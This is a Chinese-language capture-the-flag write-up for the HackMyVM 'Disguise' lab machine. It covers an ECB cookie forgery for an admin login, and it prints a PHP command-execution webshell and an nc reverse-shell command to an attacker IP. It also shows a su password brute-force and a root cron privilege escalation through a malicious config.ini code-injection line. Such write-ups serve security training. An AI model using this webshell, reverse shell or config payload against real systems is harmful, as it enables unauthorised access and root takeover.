#### 5.1 初步探索与注册功能分析

查看新站点的页面源码，未发现明显可利用信息。尝试使用之前在WordPress站点发现的用户名 `simpleAdmin` 进行弱密码登录，失败。
观察注册页面 (register.php)，发现其表单提交时存在前端JavaScript校验函数 `validateForm`，该函数限制用户名长度不能超过8个字符。

```javascript
// validateForm (部分示例)
function validateForm() {
    var username = document.forms["register"]["username"].value;
    if(username.length > 8) {
        alert("用户名不能超过8个字符");
        return false;
    }
    return true;
}
```

由于目标用户 `simpleAdmin` (11字符) 长度超过8位，该前端校验会阻止注册。可以通过浏览器开发者工具删除或修改此JS函数来绕过前端校验。

首先注册一个普通用户 `admin`，密码 `111111`，以熟悉系统功能。
登录后进入个人中心页面 (profile.php)。

```html
<!DOCTYPE html>
<html>
<head>
    <title>个人中心 - 暗黑商店</title>
    <link rel="stylesheet" href="style3.css">
</head>
<body>
    <header>
        <h1>暗黑商店</h1>
        <nav>
            <span>欢迎, admin 
            </span> | 
            <a href="index.php">首页</a> | 
                        <a href="logout.php">退出</a>
        </nav>
    </header>
    
    <div class="profile">
        <h2>个人中心</h2>
        <p>欢迎访问您的个人主页，这里可以查看和管理您的账户信息</p>
        
            </div>
</body>
</html>
```

页面源码依然简洁。使用BurpSuite抓取HTTP请求，发现登录后的Cookie中包含一个名为 `dark_session` 的字段，其值经过了URL编码，末尾的 `%3D%3D` 暗示其可能是Base64编码。

```http
GET /profile.php HTTP/1.1
Host: dark.disguise.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://dark.disguise.hmv/login.php
Connection: keep-alive
Cookie: PHPSESSID=g31oqe3lpvnk3gd1obs5pmm4a0; dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

这 `dark_session` 看起来有点机会，但目前尚不清楚其具体作用。

#### 5.2 SQL注入与XSS尝试

在进一步分析 `dark_session` 前，先尝试常规的Web漏洞测试。
使用`sqlmap`对登录表单 (login.php) 进行SQL注入检测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sqlmap -u "http://dark.disguise.hmv/login.php" --forms --batch --level=3 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:55 /2025-05-15/

[23:42:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e2744i2rksa...aqbikf4hhl'). Do you want to use those [Y/n] Y
[23:42:55] [INFO] searching for forms
[1/1] Form:
POST http://dark.disguise.hmv/login.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
do you want to fill blank fields with random values? [Y/n] Y
# ... (大量sqlmap探测过程输出) ...
[23:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[23:43:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05152025_1142pm.csv'

[*] ending @ 23:43:21 /2025-05-15/
```

Sqlmap未发现SQL注入漏洞。
尝试在注册用户名的位置输入XSS payload `<script>alert(document.domain)</script>`，密码 `111111`。登录后发现特殊字符 `<` 和 `>` 被HTML实体编码，XSS尝试失败。

#### 5.3 Cookie (`dark_session`) 分析与伪造 (ECB Oracle Padding Attack)

重点分析 `dark_session` Cookie。
以用户 `admin` (密码 `111111`) 登录后获取的 `dark_session` 为 `1mr9fHMuTh6J56IrZHP28w%3D%3D`。
使用CyberChef进行URL解码，得到 `1mr9fHMuTh6J56IrZHP28w==`。
![image-20250516123651762](https://7r1UMPH.top/image/20250516123652137.webp)
再进行Base64解码。
![image-20250516123753831](https://7r1UMPH.top/image/20250516123754183.webp)
得到一串二进制乱码。通过命令行工具验证：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d
�j�|s.N��+ds��                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d | xxd
00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..
```

这16字节的乱码很可能是加密后的用户信息。

##### 5.3.1 分析加密模式和块大小

为了分析加密细节，注册不同长度的用户名（密码固定为`111111`），观察 `dark_session` 的变化。

*   用户 `admin` (5字节): `dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D`
    *   Base64解码后xxd: `d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3` (16字节)
*   用户 `adminadmin` (10字节): `dark_session=nkhz%2FGuSp8O6W0%2FNKRWDrg%3D%3D`
    *   Base64解码后xxd: `9e48 73fc 6b92 a7c3 ba5b 4fcd 2915 83ae` (16字节)
*   用户 `adminadminadmin` (15字节): `dark_session=iVItH823tj24X11GL%2BrzqF15zKXhTZzq4geu6%2BoJYh0%3D`
    *   Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 5d79 cca5 e14d 9cea e207 aeeb ea09 621d` (32字节)
*   用户 `adminadminadminadmin` (20字节): `dark_session=iVItH823tj24X11GL%2BrzqHXcmFsh%2Be0Wk1hiTcLtOls%3D`
    *   Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b` (32字节)

观察15字节和20字节用户名的密文，它们的前16字节完全相同 (`8952...f3a8`)。这强烈暗示了加密模式为 **ECB (Electronic Codebook)**，且块大小为 **16字节**。

##### 5.3.2 确认密码不参与Cookie加密

注册用户 `test2` (5字节)，密码 `1111111111` (与之前的 `111111` 不同)。
`dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D`
Base64解码后xxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (仍为16字节)。
密文长度和结构未因密码改变而改变，确认密码不直接参与 `dark_session` 的加密。

##### 5.3.3 推断Salt和填充机制

加密的明文结构推测为 `Salt + Username`，然后进行PKCS#7填充。

*   `adminadmin` (10字节) + Salt -> 16字节密文 (1块)
*   `adminadminadmin` (15字节) + Salt -> 32字节密文 (2块)

这表明 `(Salt长度 + 10)` 经过填充后为16字节，而 `(Salt长度 + 15)` 经过填充后为32字节。
设Salt长度为 `S`。

*   `S + 10 <= 16`
*   `S + 15 > 16` (因为产生了第二块密文)

如果 `S = 4`：

*   `4 + 10 = 14`字节。PKCS#7填充2字节 (每个字节为`\x02`)，总共16字节。
*   `4 + 15 = 19`字节。PKCS#7填充13字节 (每个字节为`\x0d`)，总共32字节。
    这个推断与第一个密文块可能相同的ECB特性吻合。

进一步验证Salt长度和PKCS#7填充规则（特别是当数据长度正好是块大小时）：
注册用户 `adminadminad` (12字节)，密码 `111111`。
`dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D`
Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6` (32字节)。
如果Salt为4字节，则 `Salt(4) + adminadminad(12) = 16`字节。根据PKCS#7填充规则，当数据长度等于块大小时，仍需填充一个完整的16字节块 (16个`\x10`)。因此总明文长度为32字节，产生32字节密文。这与观察一致，确认 **Salt长度为4字节**。

##### 5.3.4 伪造simpleAdmin的Cookie

目标用户 `simpleAdmin` (11字节)。
服务器实际加密的明文为 `Salt(4) + "simpleAdmin"(11) = 15`字节。
PKCS#7填充后为 `Salt(4) + "simpleAdmin"(11) + "\x01"(padding)`，共16字节。

为了获取密文，我们可以注册一个用户名为 `simpleAdmin\x01` (这里 `\x01` 是用户名的一部分，总长12字节)。
服务器加密的明文块1将是 `Salt(4) + "simpleAdmin\x01"(username_part, 12) = 16`字节。
由于正好16字节，会再填充一个16字节的 `\x10` 块。
但重要的是，第一个16字节明文块的数据与我们目标用户 `simpleAdmin` 经过填充后的明文块数据是相同的！

操作步骤：

1. 在注册页面输入用户名 `simpleAdmin`。

2. 使用BurpSuite拦截注册请求，将`username`参数值修改为 `simpleAdmin%01` (URL编码的`\x01`)，密码 `111111`。

   *注意：登录的时候也要进行和2一样的操作*

3. 注册成功后，浏览器Cookie中的 `dark_session` 值为 %2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`。

4. URL解码：`+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=`

5. Base64解码后进行xxd查看：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx]
   └─$ echo "+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=" | base64 -d | xxd
   00000000: fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17  ._...B-......;..
   00000010: c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6  .p...9..[^.n..$.
   ```

6. 取第一个16字节的密文 `fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17`。

7. 将此16字节密文进行Base64编码：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx]
   └─$ echo "+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=" | base64 -d | head -c 16 | base64
   +1+3/NxCLcIR0Jq9qDudFw==
   ```

8. 将得到的Base64编码后的字符串 `%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D` (注意URL编码) 设置为 `dark_session` Cookie的值。

9. 访问 `http://dark.disguise.hmv/profile.php`，成功以 `simpleAdmin` 用户身份登录。
   ![image-20250516163748655](https://7r1UMPH.top/image/20250516163749012.webp)
   这波操作，来之不易啊！

### 六、获取WebShell

以`simpleAdmin`身份登录后，进入后台管理页面 (`/manager/index.php`)，发现有添加商品的功能，并且可以上传商品图片。先上传了一个`reverse.php`
![image-20250516164155309](https://7r1UMPH.top/image/20250516164155596.webp)

到首页查看源码，进入图片网址发现这个方式进入的不解析php

使用`gobuster`对 `dark.disguise.hmv` 站点进行目录扫描，确认图片上传路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/images               (Status: 301) [Size: 323] [--> http://dark.disguise.hmv/images/]
/index.php            (Status: 200) [Size: 1020]
/login.php            (Status: 200) [Size: 1134]
# ... (部分输出) ...
/captcha.php          (Status: 200) [Size: 370]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 20066 / 1323360 (1.52%)
===============================================================
Finished
===============================================================
```

发现 `/images/` 目录。但是是301状态，尝试在`/images/`访问`reverse.php`显示404,服务器对文件名做了处理（MD5或者其他哈希）
重新上传一个简单的PHP一句话木马，内容为：

```php
<?php
if (isset($_REQUEST['cmd'])) {
    $command = $_REQUEST['cmd'];
    echo "<pre>"; // For better formatting of command output

    // Execute the command
    // Using passthru for direct output, or system/exec if preferred
    passthru($command, $return_var);
    // Alternatively:
    // $output = shell_exec($command);
    // echo htmlentities($output);

    echo "</pre>";
} else {
    echo "<html><head><title>PHP CMD Exec</title></head><body>";
    echo "<form method='GET'>";
    echo "Enter command: <input type='text' name='cmd' autofocus>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
    echo "<p>Example: ?cmd=ls -la OR ?cmd=whoami</p>";
    echo "</body></html>";
}
?>
```

上传时，给文件名加了一个`'`成功报错拿到了真实文件名。
![image-20250516165009887](https://7r1UMPH.top/image/20250516165010255.webp)
访问 `http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

命令成功执行，当前用户为 `www-data`。

### 七、权限提升

#### 7.1 获取反弹Shell

利用已上传的Webshell获取一个反弹Shell，以便进行更方便的操作。
在Kali上设置监听：

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

通过Webshell执行反弹命令：
`http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash`

![image-20250516165136706](https://7r1UMPH.top/image/20250516165136907.webp)


成功接收到反弹Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.211] 51496
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

对Shell进行TTY优化：

```bash
script /dev/null -c bash
# 按 Ctrl+Z 将其置于后台
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

#### 7.2 信息收集 (www-data 用户)

在 `/var/www/dark/` 目录下找到 `config.php`。

```bash
www-data@disguise:/var/www/dark$ cat config.php 
<?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?>
```

拿到数据库用户名 `dark_db_admin` 和密码 `Str0ngPassw0d1***`。
登录数据库查看用户信息。

```bash
www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78045
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| dark_shop          |
| information_schema |
+--------------------+
2 rows in set (0.014 sec)

MariaDB [(none)]> use dark_shop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dark_shop]> show tables;
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| products            |
| users               |
+---------------------+
2 rows in set (0.000 sec)

MariaDB [dark_shop]> select * from users;
+----+------------------------------------------+--------------------------+---------+---------------------+
| id | username                                 | password                 | isAdmin | created_at          |
+----+------------------------------------------+--------------------------+---------+---------------------+
|  1 | simpleAdmin                              | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |
# ... 其他用户 ...
+----+------------------------------------------+--------------------------+---------+---------------------+
13 rows in set (0.001 sec)
```

`simpleAdmin` 的密码哈希是 `U3RyMG5nUGFzc3cwZDFAQEA=`，Base64解码后是 `Str0ngPassw0d1***`。

查看 `/home/` 目录，发现用户 `darksoul`。

```bash
www-data@disguise:/var/www/dark$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Mar 31 11:19 .
drwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..
drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
```

尝试用 `Str0ngPassw0d1***` 切换到 `darksoul`，失败。
在 `/home/darksoul/` 目录下发现 `config.ini`，内容和 `/var/www/dark/config.php` 中的数据库密码一致。

```bash
www-data@disguise:/home/darksoul$ cat config.ini 
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

看来 `darksoul` 的密码需要爆破。密码格式可能是 `Str0ngPassw0d1` + 三个特殊字符。
上传一个su爆破脚本 `suForce` 和密码字典 `pass` 到 `/tmp/`。
字典 `pass` 生成方法

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ crunch 3 3 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&*()' \ | sed 's/^/Str0ngPassw0d1/' > pass
Crunch will now generate the following amount of data: 1556068 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 389017 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l                                                               389017      
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tac pass | sponge pass                                                           
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l      
389017        
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ head -n 10 pass
Str0ngPassw0d1)))
Str0ngPassw0d1))(
Str0ngPassw0d1))*
Str0ngPassw0d1))&
Str0ngPassw0d1))^
Str0ngPassw0d1))%
Str0ngPassw0d1))$
Str0ngPassw0d1))#
Str0ngPassw0d1))@
Str0ngPassw0d1))!
```

```bash
www-data@disguise:/tmp$ wget 192.168.205.206/suForce
www-data@disguise:/tmp$ wget 192.168.205.206/pass
www-data@disguise:/tmp$ chmod +x suForce
www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | darksoul
📖 Wordlist | pass
🔎 Status   | 54031/389017/13%/Str0ngPassw0d1???  # 字典较大，这里我截取了爆破过程
💥 Password | Str0ngPassw0d1???                  # 最终爆破出来的密码
───────────────────────────────────
```

爆破成功，`darksoul` 的密码是 `Str0ngPassw0d1???`
切换用户。

```bash
www-data@disguise:/tmp$ su darksoul
Password: 
darksoul@disguise:/tmp$ id
uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
```

成功切换到 `darksoul`。查看 `user.txt`。

```bash
darksoul@disguise:~$ ls -la
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -> /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       32 May 16 06:44 darkshopcount
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cat user.txt 
Good good study & Day day up,but where is the flag?
darksoul@disguise:~$ grep -r -i 'HMV{' / 2>/dev/null
/home/darksoul/user.txt:hmv{hiddenflag}
^C
```

这里有个flag `hmv{hiddenflag}`。
用`xxd`也能看到。

```bash
darksoul@disguise:~$ xxd user.txt 
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study 
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  & Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
```

获取第一个flag: `hmv{hiddenflag}`。

#### 7.3 darksoul -> root 提权

使用`pspy64`监控进程。

```bash
darksoul@disguise:/tmp$ wget 192.168.205.206/pspy64
darksoul@disguise:/tmp$ chmod +x pspy64 
darksoul@disguise:/tmp$ ./pspy64 
# ... (pspy64 输出) ...
2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount 
2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini 
# ... (pspy64 输出) ...
```

发现一个root权限的cron定时任务，每一分钟执行 `/usr/bin/python3 /opt/query.py /home/darksoul/config.ini`。
查看 `/opt/query.py` 源码：

```python
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py <configfile>")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf) # 关键点
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
```

脚本使用了 `mysql.connector.connect(read_default_file=cnf)`，其中`cnf`是 `/home/darksoul/config.ini`。
检查 `config.ini` 的权限。

```bash
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini
```

原 `config.ini` 是root所有，darksoul不可写。但是darksoul可以重命名（因为父目录`/home/darksoul`是darksoul可写的），然后创建一个同名文件。

我当时是把原来的 `config.ini` 备份成了 `config.ini.bak`，然后新建了一个 `config.ini`。

```bash
darksoul@disguise:~$ mv config.ini config.ini.bak # 如果需要备份
darksoul@disguise:~$ touch config.ini
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini
```

查了一下 `mysql-connector-python` 的 `read_default_file`，发现存在一个可以通过配置文件执行任意代码的漏洞例如 CVE-2023-22084。信息收集的终点是wx公众号（滑稽）。
![image-20250516191958461](https://7r1UMPH.top/image/20250516191958785.webp)

构造恶意的 `config.ini`：

```ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__('os').system('chmod u+s /bin/bash')
```

这个 `allow_local_infile` 配置项（或其他可利用的配置项）会被 `mysql.connector.connect` 解析并执行后面的Python代码，从而给 `/bin/bash` 加上SUID权限。

等待cron任务执行 (最多1分钟)。可以用 `pspy64` 监控。

```bash
# pspy64 输出中会看到
2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash 
```

检查 `/bin/bash` 权限。

```bash
darksoul@disguise:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

成功加上SUID权限！执行 `bash -p` 获取root权限。

```bash
darksoul@disguise:~$ bash -p
bash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
bash-5.0# cat /root/root.txt 
#Congratulations!!!
hmv{CVE-2025-21548}
```

成功获取root权限并读取 `/root/root.txt` 中的flag: `hmv{CVE-2025-21548}`。

### 八、总结

本次Disguise靶机的渗透过程涉及了Web应用层面的信息收集、漏洞扫描、子域名爆破，以及针对ECB加密模式下Cookie的巧妙伪造。后续通过对系统内部文件和进程的分析，发现了数据库凭证泄露和cron定时任务的配置不当，最终结合Python库的特性实现了权限提升至root。整个过程环环相扣，充分展现了信息收集和漏洞利用的重要性。